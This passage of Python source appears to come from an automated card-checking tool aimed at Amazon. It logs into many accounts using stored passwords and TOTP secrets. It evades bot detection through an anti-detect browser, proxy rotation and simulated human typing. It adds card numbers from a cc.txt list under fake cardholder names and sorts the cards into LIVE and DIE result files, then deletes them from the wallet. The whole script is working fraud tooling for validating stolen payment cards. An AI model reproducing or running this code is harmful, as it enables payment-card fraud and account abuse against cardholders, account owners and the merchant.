        cards_to_process = [account['credit_cards'][0]] + added_cards
        logger.info(f"[Thread: {instance_id}] Processing {len(cards_to_process)} successfully added cards")
    
    # Navigate between pages 6 times to ensure proper loading
    for cycle in range(2):
        logger.info(f"[Thread: {instance_id}] Navigation cycle {cycle + 1}/2")
        
        logger.info(f"[Thread: {instance_id}] Navigating to payment overview")
        await browser.page.goto('https://www.amazon.com/cpe/yourpayments/overview', timeout=60000)
        await asyncio.sleep(30)
        
        logger.info(f"[Thread: {instance_id}] Navigating to wallet page")
        await browser.page.goto('https://www.amazon.com/cpe/yourpayments/wallet', timeout=60000)
        await asyncio.sleep(30)
    
    # Wait for wallet to fully load after final navigation
    try:
        await browser.page.wait_for_selector('div.apx-wallet-selectable-payment-method-tab', timeout=15000)
        logger.info(f"[Thread: {instance_id}] Wallet page loaded successfully after 2 cycles")
    except:
        logger.error(f"[Thread: {instance_id}] Failed to load wallet page after 2 cycles")
        return
    
    # Check for bank cards and identify live cards BEFORE removing ANY cards
    try:
        from datetime import datetime, timedelta
        current_time = datetime.now()
        limit_end_time = current_time + timedelta(hours=2)
        
        current_time_str = current_time.strftime('%Y-%m-%d %H:%M:%S')
        limit_end_time_str = limit_end_time.strftime('%Y-%m-%d %H:%M:%S')
        
        # Get all cards in wallet - use more specific selector for payment method tabs
        all_cards = await browser.page.locator('div.a-section.apx-wallet-selectable-payment-method-tab').all()
        
        # Create list of our test card last 4 digits (only for cards that were actually added)
        test_card_last4 = [card['number'][-4:] for card in cards_to_process]
        logger.info(f"[Thread: {instance_id}] Test cards ending in: {test_card_last4}")
        logger.info(f"[Thread: {instance_id}] Found {len(all_cards)} total cards in wallet")
        
        
        bank_cards_found = 0
        live_cards = []
        
        # FIRST: Check all cards for custom images WITHOUT removing anything
        logger.info(f"[Thread: {instance_id}] 🔍 Starting to analyze {len(all_cards)} cards in wallet...")
        
        for i, card_element in enumerate(all_cards):
            try:
                # Get text content for card description
                card_text_element = card_element.locator('span.pmts-instrument-number-tail')
                if await card_text_element.count() > 0:
                    card_text = await card_text_element.text_content()
                else:
                    card_text = await card_element.text_content()
                
                logger.info(f"[Thread: {instance_id}] Checking card {i+1}/{len(all_cards)}: {card_text}")
                
                # Skip Amazon Gift Card
                if "Amazon Gift Card" in card_text:
                    logger.info(f"[Thread: {instance_id}] Skipping Amazon Gift Card")
                    continue
                
                # Extract last 4 digits from card text
                import re
                last4_match = re.search(r'ending in •••• (\d{4})', card_text)
                if last4_match:
                    card_last4 = last4_match.group(1)
                    
                    # Simplified image detection - directly look for img element
                    card_image = None
                    
                    logger.info(f"[Thread: {instance_id}] 🔍 Starting image detection for card ending in {card_last4}...")
                    
                    try:
                        # Direct approach: find the img.apx-wallet-selectable-image within this card
                        img_element = card_element.locator('img.apx-wallet-selectable-image').first
                        
                        # Check if image exists
                        if await card_element.locator('img.apx-wallet-selectable-image').count() > 0:
                            # Get the src attribute directly
                            card_image = await img_element.get_attribute('src')
                            
                            if card_image:
                                logger.info(f"[Thread: {instance_id}] ✅ Image found: {card_image}")
                            else:
                                logger.warning(f"[Thread: {instance_id}] Image element exists but src is empty")
                        else:
                            logger.warning(f"[Thread: {instance_id}] No img.apx-wallet-selectable-image found in card")
                            
                    except Exception as e:
                        logger.warning(f"[Thread: {instance_id}] Error getting image: {e}")
                    
                    # If first approach failed, try getting innerHTML and extract
                    if not card_image:
                        try:
                            card_html = await card_element.inner_html()
                            logger.info(f"[Thread: {instance_id}] 🔧 Fallback: Extracting from HTML...")
                            # Log HTML snippet for debugging
                            logger.info(f"[Thread: {instance_id}] 📃 First 300 chars of card HTML: {card_html[:300]}")
                            
                            # Extract image src using regex
                            import re
                            # Look specifically for img tags with class containing "wallet" and src
                            pattern = r'<img[^>]*class=["\'][^"\']*wallet[^"\']*["\'][^>]*src=["\']([^"\']+)["\'][^>]*>'
                            match = re.search(pattern, card_html, re.IGNORECASE)
                            
                            if not match:
                                # Try simpler pattern
                                pattern = r'src=["\']([^"\']*\.(?:png|jpg|jpeg|webp)[^"\']*)["\']'
                                match = re.search(pattern, card_html, re.IGNORECASE)
                            
                            if match:
                                card_image = match.group(1)
                                logger.info(f"[Thread: {instance_id}] 🎉 Fallback successful! Extracted: {card_image}")
                            else:
                                logger.error(f"[Thread: {instance_id}] ❌ No image found even in HTML")
                                # Log first 1000 chars of HTML for debugging
                                logger.debug(f"[Thread: {instance_id}] HTML content: {card_html[:1000]}")
                                
                        except Exception as html_error:
                            logger.error(f"[Thread: {instance_id}] Fallback failed: {html_error}")
                    
                    # Check if this card has custom image (not default Amazon images)
                    has_custom_image = False
                    if card_image:
                        # Use improved image comparison that handles different sizes
                        normalized_id = normalize_image_src(card_image)
                        has_custom_image = not is_default_amazon_card_image(card_image)
                        status = 'LIVE' if has_custom_image else 'DIE'
                        
                        logger.info(f"[Thread: {instance_id}] 🔍 Card ending in {card_last4} - Image analysis:")
                        logger.info(f"[Thread: {instance_id}]   📷 Image URL: {card_image}")
                        logger.info(f"[Thread: {instance_id}]   🔗 Normalized ID: {normalized_id}")
                        logger.info(f"[Thread: {instance_id}]   📊 Status: {status} ({'custom bank image' if has_custom_image else 'default Amazon image'})")
                        
                        if has_custom_image:
                            logger.info(f"[Thread: {instance_id}] 🎉 LIVE CARD DETECTED! Card ending in {card_last4}")
                    else:
                        # No image found = assume default = DIE
                        logger.info(f"[Thread: {instance_id}] ⚠️ Card ending in {card_last4} - No image found (assuming default/DIE)")
                    
                    if has_custom_image:
                        # This is a bank card - find matching test card by last 4 digits (only in actually added cards)
                        matching_test_card = None
                        for test_card in cards_to_process:
                            if test_card['number'][-4:] == card_last4:
                                matching_test_card = test_card
                                break
                        
                        if matching_test_card:
                            bank_cards_found += 1
                            live_cards.append({
                                'number': matching_test_card['number'],
                                'month': matching_test_card['month'], 
                                'year': matching_test_card['year'],
                                'last4': card_last4,
                                'card_image': card_image
                            })
                            logger.info(f"[Thread: {instance_id}] 🎉 LIVE CARD FOUND: {matching_test_card['number']} -> Custom image ending in {card_last4}")
                        else:
                            logger.warning(f"[Thread: {instance_id}] Custom image card found but no matching test card: ending in {card_last4}")
                    else:
                        logger.info(f"[Thread: {instance_id}] Card ending in {card_last4} - Default Amazon image (DIE)")
                        
            except Exception as e:
                logger.error(f"[Thread: {instance_id}] Error processing card {i+1}: {e}")
                continue
        
        # Save results with summary statistics
        total_cards_checked = len(cards_to_process)
        
        if bank_cards_found > 0:
            logger.info(f"[Thread: {instance_id}] 🎉 LIVE ACCOUNT DETECTED!")
            logger.info(f"[Thread: {instance_id}] 📊 Summary: {bank_cards_found}/{total_cards_checked} cards are LIVE")
            
            # Save live cards to result/live.txt
            with open('result/live.txt', 'a', encoding='utf-8') as file:
                for live_card in live_cards:
                    file.write(f"Live|{live_card['number']}|{live_card['month']}|{live_card['year']}|[Checked: {current_time_str}]\n")
                    logger.info(f"[Thread: {instance_id}] 💾 Saved LIVE: {live_card['number']} -> Custom image ending in {live_card['last4']}")
        else:
            logger.info(f"[Thread: {instance_id}] ❌ DIE ACCOUNT - No custom image cards found")
            logger.info(f"[Thread: {instance_id}] 📊 Summary: 0/{total_cards_checked} cards are LIVE (all default Amazon images)")
        
        # Save cards that didn't become live to die.txt (only from actually added cards)
        live_card_numbers = [card['number'] for card in live_cards]
        with open('result/die.txt', 'a', encoding='utf-8') as file:
            for test_card in cards_to_process:
                if test_card['number'] not in live_card_numbers:
                    file.write(f"Die|{test_card['number']}|{test_card['month']}|{test_card['year']}|[Checked: {current_time_str}]\n")
                    logger.info(f"[Thread: {instance_id}] Saved DIE: {test_card['number']}")
        
        # Remove used cards from cc.txt file (only actually added cards)
        logger.info(f"[Thread: {instance_id}] Removing {len(cards_to_process)} used cards from cc.txt...")
        remove_used_cards_from_file(cards_to_process)
        
        # ONLY AFTER checking all cards, remove them
        logger.info(f"[Thread: {instance_id}] Now removing all test cards from wallet...")
        await remove_all_cards_from_wallet_with_count(browser, instance_id, len(test_card_last4))
        
        # Remove account from email.txt after successful processing
        logger.info(f"[Thread: {instance_id}] Removing processed account from email.txt...")
        remove_account_from_email_file(account['email'])
        
        # Save/update email to result/email.txt AFTER removing all cards (with timestamps)
        upsert_result_email(account['email'], account['password'], account['totp_secret'], current_time_str, limit_end_time_str)
        if bank_cards_found > 0:
            logger.info(f"[Thread: {instance_id}] Saved LIVE EMAIL: {account['email']} - Limit ends at {limit_end_time_str}")
        else:
            logger.info(f"[Thread: {instance_id}] Saved DIE EMAIL: {account['email']} - Limit ends at {limit_end_time_str}")
        
    except Exception as e:
        logger.error(f"[Thread: {instance_id}] Error checking wallet: {e}")
        # Save to die.txt on error (only actually added cards)
        current_time_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('result/die.txt', 'a', encoding='utf-8') as file:
            for test_card in cards_to_process:
                file.write(f"Die|{test_card['number']}|{test_card['month']}|{test_card['year']}|[Checked: {current_time_str}]\n")
        
        # Still remove used cards from cc.txt even on error (only actually added cards)
        logger.info(f"[Thread: {instance_id}] Removing used cards from cc.txt (error case)...")
        remove_used_cards_from_file(cards_to_process)
        
        # Remove account from email.txt even on error
        logger.info(f"[Thread: {instance_id}] Removing processed account from email.txt (error case)...")
        remove_account_from_email_file(account['email'])

async def run_browser_instance(instance_id: int, position: dict, account: dict, headless: bool = False, proxy_pool=None):
    """Run a single browser instance with specific position, account and proxy"""
    logger.info(f"[Thread: {instance_id}] Starting browser instance with email: {account['email']}")
    logger.info(f"[Thread: {instance_id}] Available cards: {len(account.get('credit_cards', []))}")
    
    # Get proxy config for this account
    proxy_config = account.get('proxy')
    
    max_browser_retries = 3
    
    for browser_retry in range(max_browser_retries):
        try:
            # Create browser with AntiDetect Core features
            async with StealthBrowser(
                max_retries=3,
                window_position=position,
                proxy=proxy_config,
                headless=headless,
                # AntiDetect Core settings
                timezone="America/New_York",  # Fallback if auto-detect fails
                language="en-US",
                profile_name=f"AMZ-{instance_id}",
                watermark_style="enhanced",
                webgl_spoof=True,  # Spoof GPU for better anti-detection
                auto_timezone=True,  # Auto-detect timezone from proxy IP
            ) as browser:
                # Install WAF handler so navigations can rotate proxy before restart
                async def _on_waf():
                    try:
                        await handle_waf_rotate_proxy(instance_id, proxy_config)
                    except Exception:
                        pass
                try:
                    setattr(browser, 'on_waf', _on_waf)
                except Exception:
                    pass
                # Check proxy status after browser starts
                if proxy_config:
                    logger.info(f"[Thread: {instance_id}] Checking proxy status...")
                    is_alive, result = await check_proxy_status(proxy_config)
                    
                    if is_alive:
                        logger.info(f"[Thread: {instance_id}] Proxy LIVE - IP: {result}")
                    else:
                        logger.error(f"[Thread: {instance_id}] Proxy DEAD - Error: {result}")
                        # Always use proxy: rotate IP on the same port, re-check, do not continue without proxy
                        max_rotate_attempts = 5
                        rotated_ok = False
                        for rot in range(max_rotate_attempts):
                            try:
                                await handle_waf_rotate_proxy(instance_id, proxy_config)
                            except Exception:
                                pass
                            await asyncio.sleep(1)
                            ok2, res2 = await check_proxy_status(proxy_config)
                            if ok2:
                                logger.info(f"[Thread: {instance_id}] Proxy LIVE after rotate - IP: {res2}")
                                rotated_ok = True
                                break
                            else:
                                logger.warning(f"[Thread: {instance_id}] Rotate attempt {rot+1}/{max_rotate_attempts} failed: {res2}")
                        if not rotated_ok:
                            logger.error(f"[Thread: {instance_id}] Proxy still DEAD after {max_rotate_attempts} rotates - aborting this account run")
                            return
                
                # Login with retry mechanism
                for login_attempt in range(3):  # Max 3 login attempts
                    logger.info(f"[Thread: {instance_id}] Login attempt {login_attempt + 1}")
                    
                    success = await browser.goto_with_retry('https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%2Fref%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0')
                    
                    if not success:
                        logger.error(f"[Thread: {instance_id}] Failed to load login page")
                        continue
                    
                    # Check for accordion sign-in page (blocked page indicator)
                    try:
                        accordion_signin = await browser.page.wait_for_selector('span.accordionHeaderMessage:has-text("Already a customer?")', timeout=3000)
                        if accordion_signin:
                            logger.warning(f"[Thread: {instance_id}] Detected accordion sign-in page - Browser blocked, restarting...")
                            if login_attempt < 2:  # Not last attempt
                                await browser.restart_browser()
                                continue  # This will restart the login attempt
                            else:
                                logger.error(f"[Thread: {instance_id}] Failed after all login attempts")
                                break
                    except:
                        pass  # No accordion page, continue normally
                    
                    await browser.random_mouse_movement()
                    
                    # Input email
                    await browser.human_type('#ap_email', account['email'])
                    await browser.human_click('#continue')
                    await asyncio.sleep(2)
                    
                    # Check for "We cannot find an account with that email address"
                    try:
                        email_error = await browser.page.wait_for_selector('div.a-alert-content:has-text("We cannot find an account with that email address")', timeout=3000)
                        if email_error:
                            logger.error(f"[Thread: {instance_id}] Email not found: {account['email']} - Removing from list")
                            # Save invalid email to file
                            with open('invalid_emails.txt', 'a', encoding='utf-8') as file:
                                file.write(f"{account['email']}|{account['password']}|{account['totp_secret']}\n")
                            return  # Exit function, don't retry
                    except:
                        pass  # No error message, continue
                    
                    # Input password
                    await browser.human_type('#ap_password', account['password'])
                    await browser.human_click('#signInSubmit')
                    
                    # Wait for page to load
                    await asyncio.sleep(3)
                    
                    # Check for block message after login
                    if await browser.check_captcha_or_block():
                        logger.warning(f"[Thread: {instance_id}] WAF/Captcha detected after login - Rotating proxy and restarting...")
                        try:
                            await handle_waf_rotate_proxy(instance_id, proxy_config)
                        except Exception:
                            pass
                        if login_attempt < 2:  # Not last attempt
                            await browser.restart_browser()
                            continue  # This will restart the login attempt
                        else:
                            logger.error(f"[Thread: {instance_id}] Failed after all login attempts")
                            break
                    
                    # Check current URL to determine next steps
                    current_url = browser.page.url
                    logger.info(f"[Thread: {instance_id}] Current URL: {current_url}")
                    
                    # Check for account locked message
                    try:
                        locked_alert = await browser.page.wait_for_selector('h4.a-alert-heading:has-text("Account locked temporarily")', timeout=3000)
                        if locked_alert:
                            logger.error(f"[Thread: {instance_id}] Account locked: {account['email']} - Removing from list")
                            remove_account_from_email_file(account['email'])
                            with open('locked_emails.txt', 'a', encoding='utf-8') as file:
                                file.write(f"{account['email']}|{account['password']}|{account['totp_secret']}\n")
                            return
                    except:
                        pass
                    
                    # Handle different login scenarios
                    if '/ap/mfa' in current_url:
                        # 2FA required
                        logger.info(f"[Thread: {instance_id}] 2FA required for {account['email']}")
                        
                        # Retry 2FA up to 3 times
                        max_2fa_attempts = 3
                        for attempt in range(max_2fa_attempts):
                            # Get 2FA token
                            token = get_2fa_token(account['totp_secret'])
                            if token:
                                logger.info(f"[Thread: {instance_id}] Got 2FA token (attempt {attempt + 1}): {token}")
                                await browser.human_type('#auth-mfa-otpcode', token)
                                await browser.human_click('#auth-signin-button')
                                
                                # Wait and check for invalid OTP error
                                await asyncio.sleep(3)
                                
                                # Check for account locked after 2FA
                                try:
                                    locked_alert = await browser.page.wait_for_selector('h4.a-alert-heading:has-text("Account locked temporarily")', timeout=3000)
                                    if locked_alert:
                                        logger.error(f"[Thread: {instance_id}] Account locked: {account['email']} - Removing from list")
                                        remove_account_from_email_file(account['email'])
                                        with open('locked_emails.txt', 'a', encoding='utf-8') as file:
                                            file.write(f"{account['email']}|{account['password']}|{account['totp_secret']}\n")
                                        return
                                except:
                                    pass
                                
                                # Check for account suspended after 2FA
                                try:
                                    suspended_alert = await browser.page.wait_for_selector('h4.a-alert-heading:has-text("Account on hold temporarily")', timeout=3000)
                                    if suspended_alert:
                                        logger.error(f"[Thread: {instance_id}] Account suspended: {account['email']} - Removing from list")
                                        # Remove account from email.txt
                                        remove_account_from_email_file(account['email'])
                                        # Save suspended email to file
                                        with open('suspended_emails.txt', 'a', encoding='utf-8') as file:
                                            file.write(f"{account['email']}|{account['password']}|{account['totp_secret']}\n")
                                        return  # Exit function, don't retry
                                except:
                                    pass  # No suspended message, continue
                                
                                # Check for invalid OTP message
                                try:
                                    invalid_otp = await browser.page.wait_for_selector('div.a-alert-content:has-text("The One Time Password (OTP) you entered is not valid")', timeout=3000)
                                    if invalid_otp:
                                        logger.warning(f"[Thread: {instance_id}] Invalid 2FA code (attempt {attempt + 1})")
                                        if attempt < max_2fa_attempts - 1:  # Not last attempt
                                            logger.info(f"[Thread: {instance_id}] Reloading page and trying again...")
                                            await browser.page.reload()
                                            await asyncio.sleep(2)
                                            
                                            # Re-enter email and password
                                            await browser.human_type('#ap_email', account['email'])
                                            await browser.human_click('#continue')
                                            await asyncio.sleep(2)
                                            await browser.human_type('#ap_password', account['password'])
                                            await browser.human_click('#signInSubmit')
                                            await asyncio.sleep(3)
                                            continue
                                        else:
                                            logger.error(f"[Thread: {instance_id}] Failed 2FA after {max_2fa_attempts} attempts")
                                            return
                                except:
                                    # No invalid OTP message, check for other blocks
                                    if await browser.check_captcha_or_block():
                                        logger.warning(f"[Thread: {instance_id}] WAF/Captcha detected after 2FA - Rotating proxy and restarting...")
                                        try:
                                            await handle_waf_rotate_proxy(instance_id, proxy_config)
                                        except Exception:
                                            pass
                                        if login_attempt < 2:
                                            await browser.restart_browser()
                                            break  # Break 2FA loop to restart login
                                        else:
                                            logger.error(f"[Thread: {instance_id}] Failed after all login attempts")
                                            return
                                
                                # 2FA successful, check for phone verification
                                try:
                                    skip_phone_link = await browser.page.wait_for_selector('#ap-account-fixup-phone-skip-link', timeout=3000)
                                    if skip_phone_link:
                                        logger.info(f"[Thread: {instance_id}] Phone verification prompt detected - Clicking 'Not now'")
                                        await browser.human_click('#ap-account-fixup-phone-skip-link')
                                        await asyncio.sleep(1)
                                        
                                        # Check for error page after clicking skip
                                        if await browser.check_captcha_or_block():
                                            logger.warning(f"[Thread: {instance_id}] WAF/Captcha after phone skip - Rotating proxy and restarting...")
                                            try:
                                                await handle_waf_rotate_proxy(instance_id, proxy_config)
                                            except Exception:
                                                pass
                                            if login_attempt < 2:
                                                await browser.restart_browser()
                                                break  # Break 2FA loop to restart login
                                            else:
                                                logger.error(f"[Thread: {instance_id}] Failed after all login attempts")
                                                return
                                except:
                                    logger.info(f"[Thread: {instance_id}] No phone verification prompt")
                                
                                break  # Exit 2FA retry loop
                            else:
                                logger.error(f"[Thread: {instance_id}] Failed to get 2FA token (attempt {attempt + 1})")
                                if attempt == max_2fa_attempts - 1:
                                    logger.error(f"[Thread: {instance_id}] Cannot get 2FA token after {max_2fa_attempts} attempts")
                                    return
                        
                        # If we broke out of 2FA loop due to restart, continue to next login attempt
                        if await browser.check_captcha_or_block():
                            logger.info(f"[Thread: {instance_id}] Browser was restarted, retrying login from beginning")
                            continue  # This will go back to start of login_attempt loop
                    
                    elif ('amazon.com' in current_url and 
                          ('gp/css/homepage' in current_url or 
                           'gp/yourstore' in current_url or
                           'ref=nav_ya_signin' in current_url or
                           ('nav_ya_signin' not in current_url and 'ap/signin' not in current_url))):
                        # Already logged in successfully
                        logger.info(f"[Thread: {instance_id}] Already logged in successfully")
                    
                    else:
                        # Check for account locked without 2FA
                        try:
                            locked_alert = await browser.page.wait_for_selector('h4.a-alert-heading:has-text("Account locked temporarily")', timeout=3000)
                            if locked_alert:
                                logger.error(f"[Thread: {instance_id}] Account locked: {account['email']} - Removing from list")
                                remove_account_from_email_file(account['email'])
                                with open('locked_emails.txt', 'a', encoding='utf-8') as file:
                                    file.write(f"{account['email']}|{account['password']}|{account['totp_secret']}\n")
                                return
                        except:
                            pass
                        
                        # Check for account suspended without 2FA
                        try:
                            suspended_alert = await browser.page.wait_for_selector('h4.a-alert-heading:has-text("Account on hold temporarily")', timeout=3000)
                            if suspended_alert:
                                logger.error(f"[Thread: {instance_id}] Account suspended: {account['email']} - Removing from list")
                                # Remove account from email.txt
                                remove_account_from_email_file(account['email'])
                                # Save suspended email to file
                                with open('suspended_emails.txt', 'a', encoding='utf-8') as file:
                                    file.write(f"{account['email']}|{account['password']}|{account['totp_secret']}\n")
                                return  # Exit function, don't retry
                        except:
                            pass  # No suspended message, continue
                        
                        # Check for phone verification without 2FA
                        try:
                            skip_phone_link = await browser.page.wait_for_selector('#ap-account-fixup-phone-skip-link', timeout=3000)
                            if skip_phone_link:
                                logger.info(f"[Thread: {instance_id}] Phone verification prompt detected - Clicking 'Not now'")
                                await browser.human_click('#ap-account-fixup-phone-skip-link')
                                await asyncio.sleep(1)
                                
                                # Check for error page after clicking skip
                                if await browser.check_captcha_or_block():
                                    logger.warning(f"[Thread: {instance_id}] WAF/Captcha after phone skip - Rotating proxy and restarting...")
                                    try:
                                        await handle_waf_rotate_proxy(instance_id, proxy_config)
                                    except Exception:
                                        pass
                                    if login_attempt < 2:
                                        await browser.restart_browser()
                                        continue
                                    else:
                                        logger.error(f"[Thread: {instance_id}] Failed after all login attempts")
                                        return
                        except:
                            logger.info(f"[Thread: {instance_id}] No phone verification prompt")
                    
                    # Now proceed with card adding process
                    logger.info(f"[Thread: {instance_id}] Navigating to payment settings")
                    await browser.page.goto('https://www.amazon.com/cpe/yourpayments/settings/manageoneclick', timeout=60000)
                    await asyncio.sleep(1)
                    
                    # Click Change button for payment method
                    logger.info(f"[Thread: {instance_id}] Clicking Change button")
                    try:
                        await browser.human_click('input[name*="ChangeAddressPreferredPaymentMethodEvent"][value="Change"]')
                    except:
                        await browser.human_click('input[value="Change"]')
                    
                    # Check for "Choose a nickname" popup
                    try:
                        nickname_popup = await browser.page.wait_for_selector('h1:has-text("Choose a nickname")', timeout=2000)
                        if nickname_popup:
                            logger.info(f"[Thread: {instance_id}] Choose nickname popup detected - Clicking Save")
                            await browser.human_click('input[name="ppw-widgetEvent:SaveAddressLabelEvent"]')
                    except:
                        logger.info(f"[Thread: {instance_id}] No nickname popup")
                    
                    # Click "Add a credit or debit card"
                    logger.info(f"[Thread: {instance_id}] Clicking Add a credit or debit card")
                    await browser.human_click('a:has-text("Add a credit or debit card")')
                    await asyncio.sleep(2)
                    
                    # Switch to iframe - use more flexible selector
                    try:
                        # Wait for iframe to load
                        await asyncio.sleep(2)
                        
                        # Try multiple iframe selectors
                        iframe = None
                        iframe_selectors = [
                            'iframe.apx-inline-secure-iframe',
                            'iframe.pmts-portal-component',
                            'iframe[name*="ApxSecureIframe"]',
                            'iframe[id*="pp-"]'
                        ]
                        
                        for selector in iframe_selectors:
                            if await browser.page.locator(selector).count() > 0:
                                iframe = browser.page.frame_locator(selector)
                                logger.info(f"[Thread: {instance_id}] Found iframe with selector: {selector}")
                                break
                        
                        if not iframe:
                            logger.error(f"[Thread: {instance_id}] No iframe found")
                            continue
                            
                    except Exception as e:
                        logger.error(f"[Thread: {instance_id}] Error finding iframe: {e}")
                        continue
                    
                    # Input fake name
                    logger.info(f"[Thread: {instance_id}] Inputting fake name")
                    fake_name = fake.name()
                    await iframe.locator('input[name="ppw-accountHolderName"]').fill(fake_name)
                    await asyncio.sleep(1)
                    
                    # Input credit card number
                    logger.info(f"[Thread: {instance_id}] Inputting card number")
                    try:
                        logger.debug(f"[Thread: {instance_id}] Available cards: {len(account['credit_cards'])}")
                        logger.debug(f"[Thread: {instance_id}] Card 0 data: {account['credit_cards'][0] if account['credit_cards'] else 'No cards'}")
                        
                        await iframe.locator('input[name="addCreditCardNumber"]').fill(account['credit_cards'][0]['number'])
                        
                    except IndexError as e:
                        logger.error(f"[Thread: {instance_id}] IndexError - No cards available: {e}")
                        logger.error(f"[Thread: {instance_id}] Account data: {account}")
                        return
                    except Exception as e:
                        logger.error(f"[Thread: {instance_id}] Error inputting card number: {e}")
                        logger.error(f"[Thread: {instance_id}] Full traceback: {traceback.format_exc()}")
                        continue
                    
                    # Select month from dropdown (robust)
                    logger.info(f"[Thread: {instance_id}] Selecting month")
                    month_raw = str(account['credit_cards'][0]['month']).strip()
                    month_val_candidates = []
                    try:
                        month_val_candidates.append(str(int(month_raw)))  # '01' -> '1'
                    except:
                        month_val_candidates.append(month_raw)
                    if month_raw:
                        m2 = month_raw.zfill(2)
                        if m2 not in month_val_candidates:
                            month_val_candidates.append(m2)
                    await select_dropdown_option(
                        iframe,
                        'select[name="ppw-expirationDate_month"]',
                        value_candidates=month_val_candidates,
                        label_candidates=month_val_candidates
                    )
                    await asyncio.sleep(1)
                    
                    # Select year from dropdown (robust for 2-digit/4-digit)
                    logger.info(f"[Thread: {instance_id}] Selecting year")
                    year_raw = str(account['credit_cards'][0]['year']).strip()
                    if len(year_raw) == 2:
                        y4 = '20' + year_raw
                    else:
                        y4 = year_raw
                    y2 = y4[-2:] if y4 else ''
                    year_val_candidates = [y4]
                    if y2 and y2 not in year_val_candidates:
                        year_val_candidates.append(y2)
                    year_label_candidates = year_val_candidates[:]
                    await select_dropdown_option(
                        iframe,
                        'select[name="ppw-expirationDate_year"]',
                        value_candidates=year_val_candidates,
                        label_candidates=year_label_candidates
                    )
                    await asyncio.sleep(1)
                    
                    # Click "Add your card" button (robust)
                    logger.info(f"[Thread: {instance_id}] Clicking Add your card")
                    await click_add_your_card(iframe)
                    await asyncio.sleep(3)
                    
                    # Check for exceeded maximum attempts error BEFORE clicking "Use this address" - multiple selectors
                    limit_error_found = False
                    
                    # Check multiple possible selectors for limit error
                    if (await iframe.locator('div.a-alert-content:has-text("You have exceeded the maximum attempts allowed, please retry after 2 hours.")').count() > 0 or 
                        await iframe.locator('div.a-alert-content:has-text("please retry after")').count() > 0 or
                        await iframe.locator('div.a-alert-content:has-text("exceeded the maximum attempts")').count() > 0 or
                        await iframe.locator('.a-alert-container .a-alert-content:has-text("You have exceeded")').count() > 0):
                        limit_error_found = True
                    
                    if limit_error_found:
                        logger.error(f"[Thread: {instance_id}] Email limit exceeded after adding card - going to check wallet")
                        # Remove account from email.txt
                        remove_account_from_email_file(account['email'])
                        # Save to limited_emails.txt
                        save_limited_email(account)
                        # Go to check wallet instead of returning
                        await check_wallet_and_cleanup(browser, instance_id, account)
                        return
                    
                    # Click "Use this address" button
                    logger.info(f"[Thread: {instance_id}] Clicking Use this address")
                    await iframe.locator('input[name="ppw-widgetEvent:SelectAddressEvent"]').click()
                    await asyncio.sleep(3)
                    
                    # Check for exceeded maximum attempts error after clicking "Use this address" - multiple selectors
                    limit_error_found = False
                    
                    # Check multiple possible selectors for limit error
                    if (await iframe.locator('div.a-alert-content:has-text("You have exceeded the maximum attempts allowed, please retry after 2 hours")').count() > 0 or 
                        await iframe.locator('div.a-alert-content:has-text("please retry after")').count() > 0 or
                        await iframe.locator('div.a-alert-content:has-text("exceeded the maximum attempts")').count() > 0 or
                        await iframe.locator('.a-alert-container .a-alert-content:has-text("You have exceeded")').count() > 0):
                        limit_error_found = True
                    
                    if limit_error_found:
                        logger.error(f"[Thread: {instance_id}] Email limit exceeded after using address - going to check wallet")
                        # Remove account from email.txt
                        remove_account_from_email_file(account['email'])
                        # Save to limited_emails.txt
                        save_limited_email(account)
                        # Go to check wallet instead of returning
                        await check_wallet_and_cleanup(browser, instance_id, account)
                        return
                    
                    logger.info(f"[Thread: {instance_id}] Card 1/5 added successfully")
                    
                    # Add remaining 4 cards
                    success = await add_cards_to_account(browser, instance_id, account, iframe)
                    if success == "limit_reached":
                        return  # Already went to check_wallet_and_cleanup with limited cards
                    elif isinstance(success, list):
                        # Successfully added some cards, add first card to the list
                        all_added_cards = [account['credit_cards'][0]] + success
                        logger.info(f"[Thread: {instance_id}] Successfully added {len(all_added_cards)} cards total")
                        # Check wallet and cleanup with all successfully added cards
                        await check_wallet_and_cleanup(browser, instance_id, account, all_added_cards)
                    elif not success:
                        return
                    else:
                        # All 5 cards added successfully (backward compatibility)
                        logger.info(f"[Thread: {instance_id}] Successfully added all 5 cards")
                        await check_wallet_and_cleanup(browser, instance_id, account)
                    
                    return  # Exit function successfully after completing all tasks
                
                # If we reach here, all login attempts failed
                logger.error(f"[Thread: {instance_id}] All login attempts failed")
                break  # Break browser retry loop
                
        except Exception as e:
            logger.error(f"[Thread: {instance_id}] Browser crashed (attempt {browser_retry + 1}): {str(e)}")
            logger.error(f"[Thread: {instance_id}] Full traceback: {traceback.format_exc()}")
            if browser_retry < max_browser_retries - 1:
                logger.info(f"[Thread: {instance_id}] Restarting browser...")
                await asyncio.sleep(2)
            else:
                logger.error(f"[Thread: {instance_id}] Max browser retries reached, stopping thread")
                return

async def process_accounts_with_queue(account_queue, headless, thread_count, proxy_pool=None):
    """Process accounts from a shared queue with limited threads; runs indefinitely."""
    import asyncio
    
    # Calculate positions for threads
    positions = calculate_window_positions(thread_count) if not headless else [None] * thread_count
    
    async def allocate_cards_from_file(cards_needed: int = 5):
        """Atomically pop first N cards from list/cc.txt and return as dicts."""
        global cards_lock
        if cards_lock is None:
            cards_lock = asyncio.Lock()
        async with cards_lock:
            try:
                with open('list/cc.txt', 'r', encoding='utf-8') as f:
                    lines = [ln for ln in f.readlines() if ln.strip()]
            except FileNotFoundError:
                return []
            picked = lines[:cards_needed]
            remaining = lines[cards_needed:]
            try:
                with open('list/cc.txt', 'w', encoding='utf-8') as f:
                    f.writelines(remaining)
            except Exception:
                pass
            cards = []
            for ln in picked:
                parts = ln.strip().split('|')
                if len(parts) >= 3:
                    card_data = {'number': parts[0], 'month': parts[1], 'year': parts[2]}
                    # Add CVV if available (4th part)
                    if len(parts) >= 4:
                        card_data['cvv'] = parts[3]
                    cards.append(card_data)
            return cards
    
    async def ensure_cards_for_account(account):
        if not account.get('credit_cards') or len(account.get('credit_cards', [])) < 5:
            new_cards = await allocate_cards_from_file(5)
            account['credit_cards'] = new_cards
    
    async def worker(worker_id, position):
        """Worker function to process accounts from queue"""
        while True:
            try:
